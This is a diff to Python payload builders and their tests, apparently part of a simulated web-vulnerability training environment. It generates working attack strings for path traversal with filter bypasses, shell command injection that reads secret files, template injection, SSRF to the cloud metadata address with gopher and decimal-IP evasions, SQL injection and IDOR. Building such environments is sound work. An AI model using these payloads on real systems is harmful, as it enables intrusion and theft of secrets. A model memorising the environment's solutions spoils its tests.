@@ -154,22 +154,29 @@ def _flag_record_key(graph: WorldGraph) -> str:
 
 
 def _path_payload(params: Mapping[str, object], path: str) -> str:
-    # The confinement context decides the traversal: absolute / relative ../ /
-    # the ....// that survives a single-pass ../ strip.
-    conf = params.get("confinement", "unconfined")
-    if conf in ("confined", "dotdot_filter"):
-        depth = len([s for s in str(params["base_dir"]).strip("/").split("/") if s])
-        token = "../" if conf == "confined" else "....//"
-        return token * depth + path.lstrip("/")
-    return path
+    # Mutually exclusive confinement contexts, each accepting one traversal:
+    #   absolute_only -> the raw absolute path (relative chains get stripped away)
+    #   relative      -> a plain ../ chain (absolutes are re-anchored under base)
+    #   dotdot_filter -> ....// , which survives the single-pass ../ strip
+    conf = params.get("confinement", "absolute_only")
+    if conf == "absolute_only":
+        return path
+    depth = len([s for s in str(params["base_dir"]).strip("/").split("/") if s])
+    token = "....//" if conf == "dotdot_filter" else "../"
+    return token * depth + path.lstrip("/")
 
 
 def _cmdi_payload(params: Mapping[str, object], path: str) -> str:
-    quote = params.get("quote", "")
-    if quote == '"':
-        return f"$(cat {path})"  # substitution works inside double quotes
-    if quote == "'":
-        return f"x'; cat {path}; echo '"  # break out of single quotes
+    # Mutually exclusive injection contexts (the handler strips the others):
+    #   substitution -> $() expansion (separators are stripped)
+    #   quoted       -> break the sampled wrapping quote, THEN a separator
+    #   separator    -> a bare metacharacter separator (substitution is stripped)
+    ctx = params.get("inj_context", "separator")
+    if ctx == "substitution":
+        return f"$(cat {path})"
+    if ctx == "quoted":
+        q = str(params.get("quote", "'"))
+        return f"{q}; cat {path}; echo {q}"
     return f"127.0.0.1; cat {path}"
 
 
@@ -189,7 +196,7 @@ def _xxe_payload(params: Mapping[str, object], path: str) -> str:
 
 def _ssti_payload(params: Mapping[str, object], path: str) -> str:
     access = "config[" + repr(path) + "]"
-    sink = params.get("render_sink", "raw")
+    sink = params.get("render_sink", "attribute")
     if sink == "comment":
         return "#}{{ " + access + " }}{#"  # close the {# #} the handler adds
     if sink == "expr":
@@ -208,13 +215,14 @@ def _sqli_payload(params: Mapping[str, object]) -> str:
 
 
 def _ssrf_url(params: Mapping[str, object]) -> str:
+    # Mutually exclusive evasions, each the only way past its build's filter:
     host = params["internal_host"]
-    ctx = params.get("ssrf_filter", "no_filter")
+    ctx = params.get("ssrf_filter", "decimal_ip")
     if ctx == "scheme_block":
         return f"gopher://{host}/_admin"  # http blocked; gopher reaches internal
-    if ctx == "host_allowlist_bypass":
+    if ctx == "host_allowlist":
         return f"http://{params['allowed_host']}@{host}/latest/meta-data/"
-    return f"http://{host}/latest/meta-data/"
+    return f"http://{params['internal_decimal']}/"  # decimal_ip: bare decimal host
 
 
 def _idor_id(params: Mapping[str, object], key: str) -> str:
@@ -409,13 +417,15 @@ def test_context_payload_builders_cover_every_branch() -> None:
     # A single forced episode samples only one context per class, so exercise
     # every per-context payload builder here — each must differ by context.
     p = "/var/lib/app/x/secret.bak"
-    assert _cmdi_payload({"quote": ""}, p).endswith(p)
-    assert _cmdi_payload({"quote": '"'}, p) == f"$(cat {p})"
-    assert _cmdi_payload({"quote": "'"}, p).startswith("x'; cat")
+    assert _cmdi_payload({"inj_context": "separator"}, p).endswith(p)
+    assert _cmdi_payload({"inj_context": "substitution"}, p) == f"$(cat {p})"
+    assert _cmdi_payload({"inj_context": "quoted", "quote": '"'}, p) == (
+        f'"; cat {p}; echo "'
+    )
 
     base = {"base_dir": "/srv/app/public"}
-    assert _path_payload({**base, "confinement": "unconfined"}, p) == p
-    assert _path_payload({**base, "confinement": "confined"}, p).startswith("../")
+    assert _path_payload({**base, "confinement": "absolute_only"}, p) == p
+    assert _path_payload({**base, "confinement": "relative"}, p).startswith("../")
     dotdot = _path_payload({**base, "confinement": "dotdot_filter"}, p)
     assert dotdot.startswith("....//")
 
@@ -427,7 +437,7 @@ def test_context_payload_builders_cover_every_branch() -> None:
         {"entity_context": "scheme_prefix", "uri_scheme": "vault://"}, p
     )
 
-    assert _ssti_payload({"render_sink": "raw"}, p).startswith("{{")
+    assert _ssti_payload({"render_sink": "attribute"}, p).startswith("{{")
     assert _ssti_payload({"render_sink": "comment"}, p).startswith("#}")
     assert _ssti_payload({"render_sink": "expr"}, p).startswith("config[")
 
@@ -436,10 +446,14 @@ def test_context_payload_builders_cover_every_branch() -> None:
     assert _sqli_payload({**sqli, "context": "numeric"}).startswith("0")
     assert _sqli_payload({**sqli, "context": "double"}).startswith('"')
 
-    host = {"internal_host": "169.254.169.254", "allowed_host": "ok.com"}
+    host = {
+        "internal_host": "169.254.169.254",
+        "allowed_host": "ok.com",
+        "internal_decimal": "2852039166",
+    }
     assert "gopher://" in _ssrf_url({**host, "ssrf_filter": "scheme_block"})
-    assert "@169" in _ssrf_url({**host, "ssrf_filter": "host_allowlist_bypass"})
-    assert _ssrf_url({**host, "ssrf_filter": "no_filter"}).startswith("http://169")
+    assert "@169" in _ssrf_url({**host, "ssrf_filter": "host_allowlist"})
+    assert _ssrf_url({**host, "ssrf_filter": "decimal_ip"}) == "http://2852039166/"
 
     assert _idor_id({"ref_context": "direct"}, "k") == "k"
     assert _idor_id({"ref_context": "base64"}, "k") == base64.b64encode(b"k").decode()
@@ -471,8 +485,9 @@ def test_context_payload_builders_cover_every_branch() -> None:
 
 
 def test_broken_authz_samples_all_trust_contexts() -> None:
-    # The dual_factor branch adds confirm params; one forced episode samples
-    # only one context, so cover all three (incl. the param-adding branch) here.
+    # One forced episode samples only one context, so cover all three here. The
+    # confirm gate name is sampled for every context (so single/encoded can
+    # reject a foreign dual forge), not just dual_factor.
     import random
 
     from cyber_webapp.sampling import default_vuln_params
@@ -482,6 +497,5 @@ def test_broken_authz_samples_all_trust_contexts() -> None:
     for seed in range(40):
         params = default_vuln_params("broken_authz", node, random.Random(seed))
         seen.add(params["trust_context"])
-        if params["trust_context"] == "dual_factor":
-            assert "confirm_param" in params and "confirm_value" in params
+        assert "confirm_param" in params and "confirm_value" in params
     assert seen == {"single_token", "dual_factor", "encoded_token"}
